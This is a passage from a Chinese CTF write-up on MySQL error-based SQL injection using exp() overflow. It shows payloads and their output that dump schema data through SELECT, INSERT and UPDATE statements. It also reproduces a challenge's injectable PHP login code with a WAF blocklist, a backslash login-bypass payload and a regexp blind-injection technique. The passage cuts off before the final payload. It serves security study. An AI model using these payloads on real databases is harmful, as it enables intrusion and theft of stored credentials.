uucp:x:<span class="token number">10</span>:<span class="token number">10</span>:uucp:<span class="token operator">/</span>var<span class="token operator">/</span>spool<span class="token operator">/</span>uucp:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
proxy:x:<span class="token number">13</span>:<span class="token number">13</span>:proxy:<span class="token operator">/</span>bin:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
www<span class="token operator">-</span><span class="token keyword">data</span>:x:<span class="token number">33</span>:<span class="token number">33</span>:www<span class="token operator">-</span><span class="token keyword">data</span>:<span class="token operator">/</span>var<span class="token operator">/</span>www:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin<span class="token string">' from dual)))'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个查询可以从当前的上下文中 dump 出所有的 tables 与 columns，我们也可以 dump 出所有的数据库，但由于我们是通过报错来获取，因此它返回的结果有限：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">&gt;</span> <span class="token keyword">select</span> exp<span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">*</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>concat<span class="token punctuation">(</span>@:<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token identifier"><span class="token punctuation">`</span>information_schema<span class="token punctuation">`</span></span><span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">and</span>@:<span class="token operator">=</span>concat<span class="token punctuation">(</span>@<span class="token punctuation">,</span><span class="token number">0xa</span><span class="token punctuation">,</span>table_schema<span class="token punctuation">,</span><span class="token number">0x3a3a</span><span class="token punctuation">,</span>table_name<span class="token punctuation">,</span><span class="token number">0x3a3a</span><span class="token punctuation">,</span>column_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>@<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ERROR <span class="token number">1690</span> <span class="token punctuation">(</span><span class="token number">22003</span><span class="token punctuation">)</span>: <span class="token keyword">DOUBLE</span> <span class="token keyword">value</span> <span class="token operator">is</span> <span class="token keyword">out</span> <span class="token keyword">of</span> range <span class="token operator">in</span> <span class="token string">'exp(~((select '</span><span class="token number">000</span>
ctf::flag::id
ctf::flag::flag
ctf::users::id
ctf::users::username
ctf::users::password<span class="token string">' from dual)))'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>那对于这个payload我有所疑惑，因此我询问了GPT（其中的@符号的作用）</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> exp<span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">*</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>concat<span class="token punctuation">(</span>@:<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">and</span>@:<span class="token operator">=</span>concat<span class="token punctuation">(</span>@<span class="token punctuation">,</span><span class="token number">0xa</span><span class="token punctuation">,</span>table_schema<span class="token punctuation">,</span><span class="token number">0x3a3a</span><span class="token punctuation">,</span>table_name<span class="token punctuation">,</span><span class="token number">0x3a3a</span><span class="token punctuation">,</span>column_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>@<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>在这个 SQL 查询语句中：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">@:<span class="token operator">=</span>concat<span class="token punctuation">(</span>@<span class="token punctuation">,</span><span class="token number">0xa</span><span class="token punctuation">,</span>table_schema<span class="token punctuation">,</span><span class="token number">0x3a3a</span><span class="token punctuation">,</span>table_name<span class="token punctuation">,</span><span class="token number">0x3a3a</span><span class="token punctuation">,</span>column_name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><code>@</code> 是一个用户变量，用于存储中间结果。在这里，<code>@</code> 的作用是在不同的步骤中保留中间拼接的字符串。</p>
<p>让我解释一下：</p>
<ol>
<li><code>@:=0</code>：这是一个初始化步骤，将用户变量 <code>@</code> 设置为零。</li>
<li><code>@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)</code>：在这一步，<code>concat</code> 函数用于将当前的 <code>@</code> 值与新的字符串拼接，然后将结果再次存储在 <code>@</code> 变量中。这样，<code>@</code> 变量逐渐被构建起来，包含了多次拼接的结果。</li>
</ol>
<p>实际上，这两个 <code>@</code> 符号是同一个用户变量，只是在不同的时刻被使用。第一个 <code>@</code> 是在初始化时使用，而后续的 <code>@</code> 是在拼接字符串时使用，用于保留中间结果。</p>
<h2 id="Insert位置注入">Insert位置注入</h2>
<p>根据 Insert 位置的注入方式按部就班就好了。假设原来的插入语句如下：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">insert</span> <span class="token keyword">into</span> users<span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'john'</span><span class="token punctuation">,</span><span class="token string">'679237'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>我们可以在 username 或 password 位置插入恶意的 exp() 语句进行报错注入，如下所示：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 在username处插入: </span>
john<span class="token string">' or exp(~(select * from(select user())x)),1);#, 
则sql语句为: 
insert into users(id,username,password) values(4,'</span>john<span class="token string">' or exp(~(select * from(select user())x)),1);#'</span><span class="token punctuation">,</span><span class="token string">'679237'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

mysql<span class="token operator">&gt;</span> <span class="token keyword">insert</span> <span class="token keyword">into</span> users<span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'john'</span> <span class="token operator">or</span> exp<span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#','679237');;</span>
ERROR <span class="token number">1690</span> <span class="token punctuation">(</span><span class="token number">22003</span><span class="token punctuation">)</span>: <span class="token keyword">DOUBLE</span> <span class="token keyword">value</span> <span class="token operator">is</span> <span class="token keyword">out</span> <span class="token keyword">of</span> range <span class="token operator">in</span> <span class="token string">'exp(~((select '</span>root<span class="token variable">@localhost</span><span class="token string">' from dual)))'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>爆出所有数据：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 在username处插入: </span>
john<span class="token string">' or exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)),1);#

mysql&gt; insert into users(id,username,password) values(4,'</span>john<span class="token string">' or exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)),1);#'</span><span class="token punctuation">,</span><span class="token string">'679237'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ERROR <span class="token number">1690</span> <span class="token punctuation">(</span><span class="token number">22003</span><span class="token punctuation">)</span>: <span class="token keyword">DOUBLE</span> <span class="token keyword">value</span> <span class="token operator">is</span> <span class="token keyword">out</span> <span class="token keyword">of</span> range <span class="token operator">in</span> <span class="token string">'exp(~((select '</span><span class="token number">000</span>
ctf::flag::id
ctf::flag::flag
ctf::users::id
ctf::users::username
ctf::users::password<span class="token string">' from dual)))'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Update位置注入">Update位置注入</h2>
<p>根据 Update 位置的注入方式按部就班就好了。假设原来的插入语句如下：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">update</span> users <span class="token keyword">set</span> password<span class="token operator">=</span><span class="token string">'new_value'</span> <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>我们可以在 new_value 或后面的 where 子句处插入恶意的 exp() 语句进行报错注入，如下所示：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 在new_value处插入: </span>
abc<span class="token string">' or exp(~(select * from(select user())x))#, 
则sql语句为: update users set password='</span>abc<span class="token string">' or exp(~(select * from(select user())x))# WHERE username = '</span>admin<span class="token string">';

mysql&gt; update users set password='</span>abc<span class="token string">' or exp(~(select * from(select user())x));# WHERE username = '</span>admin<span class="token string">';
ERROR 1690 (22003): DOUBLE value is out of range in '</span>exp<span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token string">'root@localhost'</span> <span class="token keyword">from</span> dual<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="exp-函数进行盲注">exp() 函数进行盲注</h2>
<p>有的登录逻辑会根据 sql 语句的报错与否返回不同的结果，如果我们可以控制这里得报错的话便可以进行盲注。下面我们通过一个 CTF 例题来进行详细探究。</p>
<h3 id="2021-虎符杯-CTF-Finalweb-Hatenum">2021 虎符杯 CTF Finalweb Hatenum</h3>
<p>进入题目是一个登录页面：（对我来说有点难度，只能基本抄wp了）</p>
<p><img src="image-20231215173228030.png" alt="image-20231215173228030"></p>
<p>我们先分析一波题目给的源码</p>
<p>home.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'location:index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{</span>
	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'hello '</span><span class="token operator">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里说如果我们存储在session变量中的username=admin的话就给flag</p>
<p>config.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">{</span>
    <span class="token comment">//数据库配置信息</span>
	<span class="token keyword">public</span> <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"123456"</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$database</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$conn</span><span class="token punctuation">;</span>
	<span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token comment">//进行数据库连接</span>
		<span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">host</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">user</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">pass</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">database</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_connect_errno</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'connect error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
    <span class="token comment">//查询用户输入的用户名是否在数据库中</span>
	<span class="token keyword">function</span> <span class="token function-definition function">find</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">conn</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select * from users where username='<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token operator">-&gt;</span><span class="token property">num_rows</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">else</span><span class="token punctuation">{</span>
			<span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

	<span class="token punctuation">}</span>
    <span class="token comment">//注册功能部分</span>
	<span class="token keyword">function</span> <span class="token function-definition function">register</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">conn</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"insert into users (username,password,code) values ('<span class="token interpolation"><span class="token variable">$username</span></span>','<span class="token interpolation"><span class="token variable">$password</span></span>','<span class="token interpolation"><span class="token variable">$code</span></span>')"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">else</span><span class="token punctuation">{</span>
			<span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
    <span class="token comment">//如果查询到对应用户名，则成功登录</span>
	<span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">conn</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select * from users where username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">conn</span><span class="token operator">-&gt;</span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token keyword">return</span> <span class="token string single-quoted-string">'error'</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">else</span><span class="token punctuation">{</span>
			<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token operator">-&gt;</span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
				<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$content</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
				<span class="token keyword">return</span> <span class="token string single-quoted-string">'success'</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
			<span class="token keyword">else</span><span class="token punctuation">{</span>
				<span class="token keyword">return</span> <span class="token string single-quoted-string">'fail'</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
		<span class="token punctuation">}</span>

	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">//进行了很有力的过滤，不过没有过滤\与()</span>
<span class="token keyword">function</span> <span class="token function-definition function">sql_waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/union|select|or|and|\'|"|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\*|,|;|\r|\n|\t|substr|right|left|mid/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Hack detected'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function-definition function">num_waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\d{9}|0x[0-9a-f]{9}/i'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Huge num detected'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function-definition function">array_waf</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$arr</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=&gt;</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token function">array_waf</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">else</span><span class="token punctuation">{</span>
			<span class="token function">sql_waf</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">num_waf</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>那我们重点关注一下sql语句部分</p>
<p><img src="image-20231215174048617.png" alt="image-20231215174048617"></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">conn</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select * from users where username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这里似乎可以构造万能密码，payload似乎与我之前刷的靶场思路一致</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">username<span class="token operator">=</span>\
password<span class="token operator">=</span><span class="token operator">||</span><span class="token number">1</span><span class="token comment">#</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'(\' and password='</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token number">1</span><span class="token comment">#'  括号内就是username的值，这样的话可以成功绕过</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>但这里有一个验证码code无从得知，只能看wp了</p>
<p>所以我们的思路是使用 rlike（即regexp）按照之前regexp匹配注入的方法，将 code 匹配出来。我们又在 login 函数中注意到：</p>
<pre class="line-numbers language-none"><code class="language-none">当使用正则匹配时，使用REGEXP和NOT REGEXP操作符(或RLIKE和NOT RLIKE，功能是一样的)
LIKE要全部匹配才返回1，而RLIKE和REGEXP则是部分匹配即可返回1。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">&gt;</span> <span class="token keyword">select</span> <span class="token string">'abcd'</span> <span class="token operator">like</span> <span class="token string">'a'</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">-----------------+</span>
<span class="token operator">|</span> <span class="token string">'abcd'</span> <span class="token operator">like</span> <span class="token string">'a'</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-----------------+</span>
<span class="token operator">|</span>               <span class="token number">0</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-----------------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.04</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">&gt;</span> <span class="token keyword">select</span> <span class="token string">'abcd'</span> <span class="token operator">rlike</span> <span class="token string">'a'</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">------------------+</span>
<span class="token operator">|</span> <span class="token string">'abcd'</span> <span class="token operator">rlike</span> <span class="token string">'a'</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">------------------+</span>
<span class="token operator">|</span>                <span class="token number">1</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">------------------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.03</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">&gt;</span> <span class="token keyword">select</span> <span class="token string">'abcd'</span> <span class="token operator">regexp</span> <span class="token string">'a'</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">-------------------+</span>
<span class="token operator">|</span> <span class="token string">'abcd'</span> <span class="token operator">regexp</span> <span class="token string">'a'</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------------------+</span>
<span class="token operator">|</span>                 <span class="token number">1</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------------------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.04</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>（好好好，又得学习一波regexp注入了~~~~）</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">if</span><span class="token punctuation">(</span>$this<span class="token operator">-</span><span class="token operator">&gt;</span>conn<span class="token operator">-</span><span class="token operator">&gt;</span>error<span class="token punctuation">)</span>{    <span class="token comment">// 如果sql语句报错就返回error</span>
    <span class="token keyword">return</span> <span class="token string">'error'</span><span class="token punctuation">;</span>
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>如果 sql 语句出现错误便返回字符串 “error”，然后进入到 login.php 中就会返回 error。根据这里的特性，如果我们可以控制这里的报错的话，便可以进行盲注。</p>
<p>但是怎么构造呢？在网上的看到了大佬的思路是真的巧妙：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">||</span>exp<span class="token punctuation">(</span><span class="token number">710</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token operator">rlike</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>即如果 <code>(... rlike ...)</code> 中的语句执行匹配后的结果为True，经过减号转换后为 <code>exp(710-1)</code> 后不会溢出；若为false，转换为 <code>exp(710-0)</code> 后则会溢出并报错。</p>
<p>大致的 payload 如下：</p>
